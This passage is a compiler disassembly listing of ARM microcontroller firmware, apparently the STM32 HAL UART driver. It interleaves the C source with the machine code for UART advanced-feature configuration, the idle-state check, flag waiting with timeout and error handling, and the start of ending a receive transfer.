 8005960:	687b      	ldr	r3, [r7, #4]
 8005962:	6b1a      	ldr	r2, [r3, #48]	; 0x30
 8005964:	687b      	ldr	r3, [r7, #4]
 8005966:	681b      	ldr	r3, [r3, #0]
 8005968:	430a      	orrs	r2, r1
 800596a:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX overrun detection disabling */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXOVERRUNDISABLE_INIT))
 800596c:	687b      	ldr	r3, [r7, #4]
 800596e:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005970:	f003 0310 	and.w	r3, r3, #16
 8005974:	2b00      	cmp	r3, #0
 8005976:	d00a      	beq.n	800598e <UART_AdvFeatureConfig+0xb2>
  {
    assert_param(IS_UART_OVERRUN(huart->AdvancedInit.OverrunDisable));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_OVRDIS, huart->AdvancedInit.OverrunDisable);
 8005978:	687b      	ldr	r3, [r7, #4]
 800597a:	681b      	ldr	r3, [r3, #0]
 800597c:	689b      	ldr	r3, [r3, #8]
 800597e:	f423 5180 	bic.w	r1, r3, #4096	; 0x1000
 8005982:	687b      	ldr	r3, [r7, #4]
 8005984:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 8005986:	687b      	ldr	r3, [r7, #4]
 8005988:	681b      	ldr	r3, [r3, #0]
 800598a:	430a      	orrs	r2, r1
 800598c:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure DMA disabling on reception error */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DMADISABLEONERROR_INIT))
 800598e:	687b      	ldr	r3, [r7, #4]
 8005990:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005992:	f003 0320 	and.w	r3, r3, #32
 8005996:	2b00      	cmp	r3, #0
 8005998:	d00a      	beq.n	80059b0 <UART_AdvFeatureConfig+0xd4>
  {
    assert_param(IS_UART_ADVFEATURE_DMAONRXERROR(huart->AdvancedInit.DMADisableonRxError));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_DDRE, huart->AdvancedInit.DMADisableonRxError);
 800599a:	687b      	ldr	r3, [r7, #4]
 800599c:	681b      	ldr	r3, [r3, #0]
 800599e:	689b      	ldr	r3, [r3, #8]
 80059a0:	f423 5100 	bic.w	r1, r3, #8192	; 0x2000
 80059a4:	687b      	ldr	r3, [r7, #4]
 80059a6:	6bda      	ldr	r2, [r3, #60]	; 0x3c
 80059a8:	687b      	ldr	r3, [r7, #4]
 80059aa:	681b      	ldr	r3, [r3, #0]
 80059ac:	430a      	orrs	r2, r1
 80059ae:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure auto Baud rate detection scheme */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_AUTOBAUDRATE_INIT))
 80059b0:	687b      	ldr	r3, [r7, #4]
 80059b2:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80059b4:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80059b8:	2b00      	cmp	r3, #0
 80059ba:	d01a      	beq.n	80059f2 <UART_AdvFeatureConfig+0x116>
  {
    assert_param(IS_USART_AUTOBAUDRATE_DETECTION_INSTANCE(huart->Instance));
    assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATE(huart->AdvancedInit.AutoBaudRateEnable));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_ABREN, huart->AdvancedInit.AutoBaudRateEnable);
 80059bc:	687b      	ldr	r3, [r7, #4]
 80059be:	681b      	ldr	r3, [r3, #0]
 80059c0:	685b      	ldr	r3, [r3, #4]
 80059c2:	f423 1180 	bic.w	r1, r3, #1048576	; 0x100000
 80059c6:	687b      	ldr	r3, [r7, #4]
 80059c8:	6c1a      	ldr	r2, [r3, #64]	; 0x40
 80059ca:	687b      	ldr	r3, [r7, #4]
 80059cc:	681b      	ldr	r3, [r3, #0]
 80059ce:	430a      	orrs	r2, r1
 80059d0:	605a      	str	r2, [r3, #4]
    /* set auto Baudrate detection parameters if detection is enabled */
    if (huart->AdvancedInit.AutoBaudRateEnable == UART_ADVFEATURE_AUTOBAUDRATE_ENABLE)
 80059d2:	687b      	ldr	r3, [r7, #4]
 80059d4:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80059d6:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 80059da:	d10a      	bne.n	80059f2 <UART_AdvFeatureConfig+0x116>
    {
      assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATEMODE(huart->AdvancedInit.AutoBaudRateMode));
      MODIFY_REG(huart->Instance->CR2, USART_CR2_ABRMODE, huart->AdvancedInit.AutoBaudRateMode);
 80059dc:	687b      	ldr	r3, [r7, #4]
 80059de:	681b      	ldr	r3, [r3, #0]
 80059e0:	685b      	ldr	r3, [r3, #4]
 80059e2:	f423 01c0 	bic.w	r1, r3, #6291456	; 0x600000
 80059e6:	687b      	ldr	r3, [r7, #4]
 80059e8:	6c5a      	ldr	r2, [r3, #68]	; 0x44
 80059ea:	687b      	ldr	r3, [r7, #4]
 80059ec:	681b      	ldr	r3, [r3, #0]
 80059ee:	430a      	orrs	r2, r1
 80059f0:	605a      	str	r2, [r3, #4]
    }
  }

  /* if required, configure MSB first on communication line */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_MSBFIRST_INIT))
 80059f2:	687b      	ldr	r3, [r7, #4]
 80059f4:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80059f6:	f003 0380 	and.w	r3, r3, #128	; 0x80
 80059fa:	2b00      	cmp	r3, #0
 80059fc:	d00a      	beq.n	8005a14 <UART_AdvFeatureConfig+0x138>
  {
    assert_param(IS_UART_ADVFEATURE_MSBFIRST(huart->AdvancedInit.MSBFirst));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_MSBFIRST, huart->AdvancedInit.MSBFirst);
 80059fe:	687b      	ldr	r3, [r7, #4]
 8005a00:	681b      	ldr	r3, [r3, #0]
 8005a02:	685b      	ldr	r3, [r3, #4]
 8005a04:	f423 2100 	bic.w	r1, r3, #524288	; 0x80000
 8005a08:	687b      	ldr	r3, [r7, #4]
 8005a0a:	6c9a      	ldr	r2, [r3, #72]	; 0x48
 8005a0c:	687b      	ldr	r3, [r7, #4]
 8005a0e:	681b      	ldr	r3, [r3, #0]
 8005a10:	430a      	orrs	r2, r1
 8005a12:	605a      	str	r2, [r3, #4]
  }
}
 8005a14:	bf00      	nop
 8005a16:	370c      	adds	r7, #12
 8005a18:	46bd      	mov	sp, r7
 8005a1a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005a1e:	4770      	bx	lr

08005a20 <UART_CheckIdleState>:
  * @brief Check the UART Idle State.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_CheckIdleState(UART_HandleTypeDef *huart)
{
 8005a20:	b580      	push	{r7, lr}
 8005a22:	b098      	sub	sp, #96	; 0x60
 8005a24:	af02      	add	r7, sp, #8
 8005a26:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;

  /* Initialize the UART ErrorCode */
  huart->ErrorCode = HAL_UART_ERROR_NONE;
 8005a28:	687b      	ldr	r3, [r7, #4]
 8005a2a:	2200      	movs	r2, #0
 8005a2c:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

  /* Init tickstart for timeout management */
  tickstart = HAL_GetTick();
 8005a30:	f7fb fb62 	bl	80010f8 <HAL_GetTick>
 8005a34:	6578      	str	r0, [r7, #84]	; 0x54

  /* Check if the Transmitter is enabled */
  if ((huart->Instance->CR1 & USART_CR1_TE) == USART_CR1_TE)
 8005a36:	687b      	ldr	r3, [r7, #4]
 8005a38:	681b      	ldr	r3, [r3, #0]
 8005a3a:	681b      	ldr	r3, [r3, #0]
 8005a3c:	f003 0308 	and.w	r3, r3, #8
 8005a40:	2b08      	cmp	r3, #8
 8005a42:	d12e      	bne.n	8005aa2 <UART_CheckIdleState+0x82>
  {
    /* Wait until TEACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_TEACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005a44:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005a48:	9300      	str	r3, [sp, #0]
 8005a4a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005a4c:	2200      	movs	r2, #0
 8005a4e:	f44f 1100 	mov.w	r1, #2097152	; 0x200000
 8005a52:	6878      	ldr	r0, [r7, #4]
 8005a54:	f000 f88c 	bl	8005b70 <UART_WaitOnFlagUntilTimeout>
 8005a58:	4603      	mov	r3, r0
 8005a5a:	2b00      	cmp	r3, #0
 8005a5c:	d021      	beq.n	8005aa2 <UART_CheckIdleState+0x82>
    {
      /* Disable TXE interrupt for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE_TXFNFIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE));
 8005a5e:	687b      	ldr	r3, [r7, #4]
 8005a60:	681b      	ldr	r3, [r3, #0]
 8005a62:	63bb      	str	r3, [r7, #56]	; 0x38
 */
__STATIC_FORCEINLINE uint32_t __LDREXW(volatile uint32_t *addr)
{
    uint32_t result;

   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005a64:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005a66:	e853 3f00 	ldrex	r3, [r3]
 8005a6a:	637b      	str	r3, [r7, #52]	; 0x34
   return(result);
 8005a6c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005a6e:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 8005a72:	653b      	str	r3, [r7, #80]	; 0x50
 8005a74:	687b      	ldr	r3, [r7, #4]
 8005a76:	681b      	ldr	r3, [r3, #0]
 8005a78:	461a      	mov	r2, r3
 8005a7a:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8005a7c:	647b      	str	r3, [r7, #68]	; 0x44
 8005a7e:	643a      	str	r2, [r7, #64]	; 0x40
 */
__STATIC_FORCEINLINE uint32_t __STREXW(uint32_t value, volatile uint32_t *addr)
{
   uint32_t result;

   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005a80:	6c39      	ldr	r1, [r7, #64]	; 0x40
 8005a82:	6c7a      	ldr	r2, [r7, #68]	; 0x44
 8005a84:	e841 2300 	strex	r3, r2, [r1]
 8005a88:	63fb      	str	r3, [r7, #60]	; 0x3c
   return(result);
 8005a8a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8005a8c:	2b00      	cmp	r3, #0
 8005a8e:	d1e6      	bne.n	8005a5e <UART_CheckIdleState+0x3e>
#endif /* USART_CR1_FIFOEN */

      huart->gState = HAL_UART_STATE_READY;
 8005a90:	687b      	ldr	r3, [r7, #4]
 8005a92:	2220      	movs	r2, #32
 8005a94:	67da      	str	r2, [r3, #124]	; 0x7c

      __HAL_UNLOCK(huart);
 8005a96:	687b      	ldr	r3, [r7, #4]
 8005a98:	2200      	movs	r2, #0
 8005a9a:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005a9e:	2303      	movs	r3, #3
 8005aa0:	e062      	b.n	8005b68 <UART_CheckIdleState+0x148>
    }
  }

  /* Check if the Receiver is enabled */
  if ((huart->Instance->CR1 & USART_CR1_RE) == USART_CR1_RE)
 8005aa2:	687b      	ldr	r3, [r7, #4]
 8005aa4:	681b      	ldr	r3, [r3, #0]
 8005aa6:	681b      	ldr	r3, [r3, #0]
 8005aa8:	f003 0304 	and.w	r3, r3, #4
 8005aac:	2b04      	cmp	r3, #4
 8005aae:	d149      	bne.n	8005b44 <UART_CheckIdleState+0x124>
  {
    /* Wait until REACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_REACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005ab0:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005ab4:	9300      	str	r3, [sp, #0]
 8005ab6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005ab8:	2200      	movs	r2, #0
 8005aba:	f44f 0180 	mov.w	r1, #4194304	; 0x400000
 8005abe:	6878      	ldr	r0, [r7, #4]
 8005ac0:	f000 f856 	bl	8005b70 <UART_WaitOnFlagUntilTimeout>
 8005ac4:	4603      	mov	r3, r0
 8005ac6:	2b00      	cmp	r3, #0
 8005ac8:	d03c      	beq.n	8005b44 <UART_CheckIdleState+0x124>
      /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error)
      interrupts for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005aca:	687b      	ldr	r3, [r7, #4]
 8005acc:	681b      	ldr	r3, [r3, #0]
 8005ace:	627b      	str	r3, [r7, #36]	; 0x24
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005ad0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005ad2:	e853 3f00 	ldrex	r3, [r3]
 8005ad6:	623b      	str	r3, [r7, #32]
   return(result);
 8005ad8:	6a3b      	ldr	r3, [r7, #32]
 8005ada:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005ade:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005ae0:	687b      	ldr	r3, [r7, #4]
 8005ae2:	681b      	ldr	r3, [r3, #0]
 8005ae4:	461a      	mov	r2, r3
 8005ae6:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005ae8:	633b      	str	r3, [r7, #48]	; 0x30
 8005aea:	62fa      	str	r2, [r7, #44]	; 0x2c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005aec:	6af9      	ldr	r1, [r7, #44]	; 0x2c
 8005aee:	6b3a      	ldr	r2, [r7, #48]	; 0x30
 8005af0:	e841 2300 	strex	r3, r2, [r1]
 8005af4:	62bb      	str	r3, [r7, #40]	; 0x28
   return(result);
 8005af6:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8005af8:	2b00      	cmp	r3, #0
 8005afa:	d1e6      	bne.n	8005aca <UART_CheckIdleState+0xaa>
#endif /* USART_CR1_FIFOEN */
      ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005afc:	687b      	ldr	r3, [r7, #4]
 8005afe:	681b      	ldr	r3, [r3, #0]
 8005b00:	3308      	adds	r3, #8
 8005b02:	613b      	str	r3, [r7, #16]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005b04:	693b      	ldr	r3, [r7, #16]
 8005b06:	e853 3f00 	ldrex	r3, [r3]
 8005b0a:	60fb      	str	r3, [r7, #12]
   return(result);
 8005b0c:	68fb      	ldr	r3, [r7, #12]
 8005b0e:	f023 0301 	bic.w	r3, r3, #1
 8005b12:	64bb      	str	r3, [r7, #72]	; 0x48
 8005b14:	687b      	ldr	r3, [r7, #4]
 8005b16:	681b      	ldr	r3, [r3, #0]
 8005b18:	3308      	adds	r3, #8
 8005b1a:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005b1c:	61fa      	str	r2, [r7, #28]
 8005b1e:	61bb      	str	r3, [r7, #24]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005b20:	69b9      	ldr	r1, [r7, #24]
 8005b22:	69fa      	ldr	r2, [r7, #28]
 8005b24:	e841 2300 	strex	r3, r2, [r1]
 8005b28:	617b      	str	r3, [r7, #20]
   return(result);
 8005b2a:	697b      	ldr	r3, [r7, #20]
 8005b2c:	2b00      	cmp	r3, #0
 8005b2e:	d1e5      	bne.n	8005afc <UART_CheckIdleState+0xdc>

      huart->RxState = HAL_UART_STATE_READY;
 8005b30:	687b      	ldr	r3, [r7, #4]
 8005b32:	2220      	movs	r2, #32
 8005b34:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80

      __HAL_UNLOCK(huart);
 8005b38:	687b      	ldr	r3, [r7, #4]
 8005b3a:	2200      	movs	r2, #0
 8005b3c:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005b40:	2303      	movs	r3, #3
 8005b42:	e011      	b.n	8005b68 <UART_CheckIdleState+0x148>
    }
  }

  /* Initialize the UART State */
  huart->gState = HAL_UART_STATE_READY;
 8005b44:	687b      	ldr	r3, [r7, #4]
 8005b46:	2220      	movs	r2, #32
 8005b48:	67da      	str	r2, [r3, #124]	; 0x7c
  huart->RxState = HAL_UART_STATE_READY;
 8005b4a:	687b      	ldr	r3, [r7, #4]
 8005b4c:	2220      	movs	r2, #32
 8005b4e:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005b52:	687b      	ldr	r3, [r7, #4]
 8005b54:	2200      	movs	r2, #0
 8005b56:	661a      	str	r2, [r3, #96]	; 0x60
  huart->RxEventType = HAL_UART_RXEVENT_TC;
 8005b58:	687b      	ldr	r3, [r7, #4]
 8005b5a:	2200      	movs	r2, #0
 8005b5c:	665a      	str	r2, [r3, #100]	; 0x64

  __HAL_UNLOCK(huart);
 8005b5e:	687b      	ldr	r3, [r7, #4]
 8005b60:	2200      	movs	r2, #0
 8005b62:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

  return HAL_OK;
 8005b66:	2300      	movs	r3, #0
}
 8005b68:	4618      	mov	r0, r3
 8005b6a:	3758      	adds	r7, #88	; 0x58
 8005b6c:	46bd      	mov	sp, r7
 8005b6e:	bd80      	pop	{r7, pc}

08005b70 <UART_WaitOnFlagUntilTimeout>:
  * @param Timeout   Timeout duration
  * @retval HAL status
  */
HAL_StatusTypeDef UART_WaitOnFlagUntilTimeout(UART_HandleTypeDef *huart, uint32_t Flag, FlagStatus Status,
                                              uint32_t Tickstart, uint32_t Timeout)
{
 8005b70:	b580      	push	{r7, lr}
 8005b72:	b084      	sub	sp, #16
 8005b74:	af00      	add	r7, sp, #0
 8005b76:	60f8      	str	r0, [r7, #12]
 8005b78:	60b9      	str	r1, [r7, #8]
 8005b7a:	603b      	str	r3, [r7, #0]
 8005b7c:	4613      	mov	r3, r2
 8005b7e:	71fb      	strb	r3, [r7, #7]
  /* Wait until flag is set */
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005b80:	e049      	b.n	8005c16 <UART_WaitOnFlagUntilTimeout+0xa6>
  {
    /* Check for the Timeout */
    if (Timeout != HAL_MAX_DELAY)
 8005b82:	69bb      	ldr	r3, [r7, #24]
 8005b84:	f1b3 3fff 	cmp.w	r3, #4294967295
 8005b88:	d045      	beq.n	8005c16 <UART_WaitOnFlagUntilTimeout+0xa6>
    {
      if (((HAL_GetTick() - Tickstart) > Timeout) || (Timeout == 0U))
 8005b8a:	f7fb fab5 	bl	80010f8 <HAL_GetTick>
 8005b8e:	4602      	mov	r2, r0
 8005b90:	683b      	ldr	r3, [r7, #0]
 8005b92:	1ad3      	subs	r3, r2, r3
 8005b94:	69ba      	ldr	r2, [r7, #24]
 8005b96:	429a      	cmp	r2, r3
 8005b98:	d302      	bcc.n	8005ba0 <UART_WaitOnFlagUntilTimeout+0x30>
 8005b9a:	69bb      	ldr	r3, [r7, #24]
 8005b9c:	2b00      	cmp	r3, #0
 8005b9e:	d101      	bne.n	8005ba4 <UART_WaitOnFlagUntilTimeout+0x34>
      {

        return HAL_TIMEOUT;
 8005ba0:	2303      	movs	r3, #3
 8005ba2:	e048      	b.n	8005c36 <UART_WaitOnFlagUntilTimeout+0xc6>
      }

      if (READ_BIT(huart->Instance->CR1, USART_CR1_RE) != 0U)
 8005ba4:	68fb      	ldr	r3, [r7, #12]
 8005ba6:	681b      	ldr	r3, [r3, #0]
 8005ba8:	681b      	ldr	r3, [r3, #0]
 8005baa:	f003 0304 	and.w	r3, r3, #4
 8005bae:	2b00      	cmp	r3, #0
 8005bb0:	d031      	beq.n	8005c16 <UART_WaitOnFlagUntilTimeout+0xa6>
      {
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_ORE) == SET)
 8005bb2:	68fb      	ldr	r3, [r7, #12]
 8005bb4:	681b      	ldr	r3, [r3, #0]
 8005bb6:	69db      	ldr	r3, [r3, #28]
 8005bb8:	f003 0308 	and.w	r3, r3, #8
 8005bbc:	2b08      	cmp	r3, #8
 8005bbe:	d110      	bne.n	8005be2 <UART_WaitOnFlagUntilTimeout+0x72>
        {
          /* Clear Overrun Error flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_OREF);
 8005bc0:	68fb      	ldr	r3, [r7, #12]
 8005bc2:	681b      	ldr	r3, [r3, #0]
 8005bc4:	2208      	movs	r2, #8
 8005bc6:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005bc8:	68f8      	ldr	r0, [r7, #12]
 8005bca:	f000 f838 	bl	8005c3e <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_ORE;
 8005bce:	68fb      	ldr	r3, [r7, #12]
 8005bd0:	2208      	movs	r2, #8
 8005bd2:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005bd6:	68fb      	ldr	r3, [r7, #12]
 8005bd8:	2200      	movs	r2, #0
 8005bda:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_ERROR;
 8005bde:	2301      	movs	r3, #1
 8005be0:	e029      	b.n	8005c36 <UART_WaitOnFlagUntilTimeout+0xc6>
        }
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_RTOF) == SET)
 8005be2:	68fb      	ldr	r3, [r7, #12]
 8005be4:	681b      	ldr	r3, [r3, #0]
 8005be6:	69db      	ldr	r3, [r3, #28]
 8005be8:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8005bec:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005bf0:	d111      	bne.n	8005c16 <UART_WaitOnFlagUntilTimeout+0xa6>
        {
          /* Clear Receiver Timeout flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_RTOF);
 8005bf2:	68fb      	ldr	r3, [r7, #12]
 8005bf4:	681b      	ldr	r3, [r3, #0]
 8005bf6:	f44f 6200 	mov.w	r2, #2048	; 0x800
 8005bfa:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005bfc:	68f8      	ldr	r0, [r7, #12]
 8005bfe:	f000 f81e 	bl	8005c3e <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_RTO;
 8005c02:	68fb      	ldr	r3, [r7, #12]
 8005c04:	2220      	movs	r2, #32
 8005c06:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005c0a:	68fb      	ldr	r3, [r7, #12]
 8005c0c:	2200      	movs	r2, #0
 8005c0e:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_TIMEOUT;
 8005c12:	2303      	movs	r3, #3
 8005c14:	e00f      	b.n	8005c36 <UART_WaitOnFlagUntilTimeout+0xc6>
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005c16:	68fb      	ldr	r3, [r7, #12]
 8005c18:	681b      	ldr	r3, [r3, #0]
 8005c1a:	69da      	ldr	r2, [r3, #28]
 8005c1c:	68bb      	ldr	r3, [r7, #8]
 8005c1e:	4013      	ands	r3, r2
 8005c20:	68ba      	ldr	r2, [r7, #8]
 8005c22:	429a      	cmp	r2, r3
 8005c24:	bf0c      	ite	eq
 8005c26:	2301      	moveq	r3, #1
 8005c28:	2300      	movne	r3, #0
 8005c2a:	b2db      	uxtb	r3, r3
 8005c2c:	461a      	mov	r2, r3
 8005c2e:	79fb      	ldrb	r3, [r7, #7]
 8005c30:	429a      	cmp	r2, r3
 8005c32:	d0a6      	beq.n	8005b82 <UART_WaitOnFlagUntilTimeout+0x12>
        }
      }
    }
  }
  return HAL_OK;
 8005c34:	2300      	movs	r3, #0
}
 8005c36:	4618      	mov	r0, r3
 8005c38:	3710      	adds	r7, #16
 8005c3a:	46bd      	mov	sp, r7
 8005c3c:	bd80      	pop	{r7, pc}

08005c3e <UART_EndRxTransfer>:
  * @brief  End ongoing Rx transfer on UART peripheral (following error detection or Reception completion).
  * @param  huart UART handle.
  * @retval None
  */
static void UART_EndRxTransfer(UART_HandleTypeDef *huart)
{
 8005c3e:	b480      	push	{r7}
 8005c40:	b095      	sub	sp, #84	; 0x54
 8005c42:	af00      	add	r7, sp, #0
 8005c44:	6078      	str	r0, [r7, #4]
  /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error) interrupts */
#if defined(USART_CR1_FIFOEN)
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, (USART_CR3_EIE | USART_CR3_RXFTIE));
#else
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005c46:	687b      	ldr	r3, [r7, #4]
 8005c48:	681b      	ldr	r3, [r3, #0]
 8005c4a:	637b      	str	r3, [r7, #52]	; 0x34
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005c4c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005c4e:	e853 3f00 	ldrex	r3, [r3]
 8005c52:	633b      	str	r3, [r7, #48]	; 0x30
   return(result);
 8005c54:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8005c56:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005c5a:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005c5c:	687b      	ldr	r3, [r7, #4]
 8005c5e:	681b      	ldr	r3, [r3, #0]
 8005c60:	461a      	mov	r2, r3
 8005c62:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005c64:	643b      	str	r3, [r7, #64]	; 0x40
 8005c66:	63fa      	str	r2, [r7, #60]	; 0x3c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005c68:	6bf9      	ldr	r1, [r7, #60]	; 0x3c
 8005c6a:	6c3a      	ldr	r2, [r7, #64]	; 0x40
 8005c6c:	e841 2300 	strex	r3, r2, [r1]
 8005c70:	63bb      	str	r3, [r7, #56]	; 0x38
   return(result);
 8005c72:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005c74:	2b00      	cmp	r3, #0
 8005c76:	d1e6      	bne.n	8005c46 <UART_EndRxTransfer+0x8>
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005c78:	687b      	ldr	r3, [r7, #4]
 8005c7a:	681b      	ldr	r3, [r3, #0]
 8005c7c:	3308      	adds	r3, #8
 8005c7e:	623b      	str	r3, [r7, #32]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005c80:	6a3b      	ldr	r3, [r7, #32]
 8005c82:	e853 3f00 	ldrex	r3, [r3]
 8005c86:	61fb      	str	r3, [r7, #28]
   return(result);
 8005c88:	69fb      	ldr	r3, [r7, #28]
 8005c8a:	f023 0301 	bic.w	r3, r3, #1
 8005c8e:	64bb      	str	r3, [r7, #72]	; 0x48
 8005c90:	687b      	ldr	r3, [r7, #4]
 8005c92:	681b      	ldr	r3, [r3, #0]
 8005c94:	3308      	adds	r3, #8
 8005c96:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005c98:	62fa      	str	r2, [r7, #44]	; 0x2c
 8005c9a:	62bb      	str	r3, [r7, #40]	; 0x28
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005c9c:	6ab9      	ldr	r1, [r7, #40]	; 0x28
 8005c9e:	6afa      	ldr	r2, [r7, #44]	; 0x2c
 8005ca0:	e841 2300 	strex	r3, r2, [r1]
 8005ca4:	627b      	str	r3, [r7, #36]	; 0x24
   return(result);
 8005ca6:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005ca8:	2b00      	cmp	r3, #0
 8005caa:	d1e5      	bne.n	8005c78 <UART_EndRxTransfer+0x3a>
#endif /* USART_CR1_FIFOEN */

  /* In case of reception waiting for IDLE event, disable also the IDLE IE interrupt source */
  if (huart->ReceptionType == HAL_UART_RECEPTION_TOIDLE)
 8005cac:	687b      	ldr	r3, [r7, #4]
 8005cae:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8005cb0:	2b01      	cmp	r3, #1
 8005cb2:	d118      	bne.n	8005ce6 <UART_EndRxTransfer+0xa8>
  {
    ATOMIC_CLEAR_BIT(huart->Instance->CR1, USART_CR1_IDLEIE);
 8005cb4:	687b      	ldr	r3, [r7, #4]
 8005cb6:	681b      	ldr	r3, [r3, #0]
 8005cb8:	60fb      	str	r3, [r7, #12]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
